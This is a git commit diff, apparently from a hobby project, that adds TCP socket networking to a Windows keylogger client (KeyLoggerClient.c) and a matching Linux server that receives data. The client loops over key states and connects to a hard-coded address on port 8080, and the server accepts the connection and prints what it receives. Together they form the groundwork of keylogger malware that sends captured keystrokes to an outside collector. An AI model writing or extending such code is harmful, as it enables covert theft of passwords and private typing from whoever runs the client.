97e5a9c206b726bd071d13118efdc8eda7f126b2
JoaoTorpe <victotorpe10@gmail.com>
2024-08-24 12:09:26 -0300

    Conexao via sockets

--- KeyLoggerClient.c
+++ KeyLoggerClient.c
@@ -1,13 +1,48 @@
 #include <stdio.h>
 #include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <strings.h>
+#include <rpcndr.h>
+
+
+#pragma comment(lib, "Ws2_32.lib")
 
 #define BUFFER_SIZE 4096
 #define INTERVALO 60
+#define PORT 8080
 
 int main() {
+
+    WSADATA wsaData;
+    SOCKET sockfd;
+    struct sockaddr_in serv_addr;
+
     short keyState;
     char buffer[BUFFER_SIZE] = {0};
      size_t len = 0;
+
+     //Criando conexão via sockets
+      WSAStartup(MAKEWORD(2,2), &wsaData);
+    
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == INVALID_SOCKET) {
+        printf("Erro ao abrir o socket: %d\n", WSAGetLastError());
+        WSACleanup();
+        return 1;
+    }
+
+     serv_addr.sin_family = AF_INET;
+     serv_addr.sin_port = htons(PORT);
+     serv_addr.sin_addr.s_addr = inet_addr("192.168.100.94");
+
+     if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
+        printf("Erro ao conectar: %d\n", WSAGetLastError());
+        closesocket(sockfd);
+        WSACleanup();
+        return 1;
+    }
+
 
     while (1) {
         // Loop através das teclas
--- KeyLoggerServer.c
+++ KeyLoggerServer.c
@@ -1,6 +1,43 @@
 #include <stdio.h>
-
+#include <unistd.h>
+#include <arpa/inet.h>
 int main(){
 
+    int sockfd, newsockfd;
+    struct sockaddr_in serv_addr, cli_addr;
+    socklen_t clilen;
+    char buffer[256];
+    
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Erro ao abrir o socket");
+        exit(1);
+    }
+    
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = INADDR_ANY;
+    serv_addr.sin_port = htons(8080);
+    
+    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Erro no bind");
+        exit(1);
+    }
+    
+    listen(sockfd, 5);
+    clilen = sizeof(cli_addr);
+    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
+    if (newsockfd < 0) {
+        perror("Erro no accept");
+        exit(1);
+    }
+    
+    bzero(buffer, 256);
+    read(newsockfd, buffer, 255);
+    printf("Mensagem recebida: %s\n", buffer);
+    
+    close(newsockfd);
+    close(sockfd);
+    return 0;
     
 }
